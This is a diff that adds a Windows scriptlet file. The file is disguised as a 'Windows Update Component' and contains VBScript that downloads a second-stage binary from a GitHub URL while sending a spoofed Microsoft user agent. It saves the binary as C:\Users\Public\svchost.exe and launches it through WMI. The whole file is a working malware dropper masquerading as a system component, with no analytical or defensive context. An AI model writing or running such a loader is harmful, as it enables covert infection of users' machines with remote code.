@@ -1,0 +1,31 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+    progid="WindowsUpdate"
+    classid="{A111B222-C333-D444-E555-F666G777H888}"
+    description="Windows Update Component"
+    version="1.0.0"
+>
+</registration>
+<script language="VBScript">
+    Dim xmlhttp, stream, wmi, process
+    
+    Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xmlhttp.open "GET", "https://raw.githubusercontent.com/AvangardSec1/avn.gov.ua/refs/heads/main/stage2.bin", False
+    xmlhttp.setRequestHeader "User-Agent", "Microsoft-CryptoAPI/10.0"
+    xmlhttp.send
+    
+    If xmlhttp.status = 200 Then
+        Set stream = CreateObject("ADODB.Stream")
+        stream.type = 1
+        stream.open
+        stream.write xmlhttp.responseBody
+        stream.savetofile "C:\Users\Public\svchost.exe", 2
+        stream.close
+        
+        Set wmi = GetObject("winmgmts:\\.\root\cimv2")
+        Set process = wmi.Get("Win32_Process")
+        process.Create "C:\Users\Public\svchost.exe", Null, Null, 0
+    End If
+</script>
+</scriptlet>
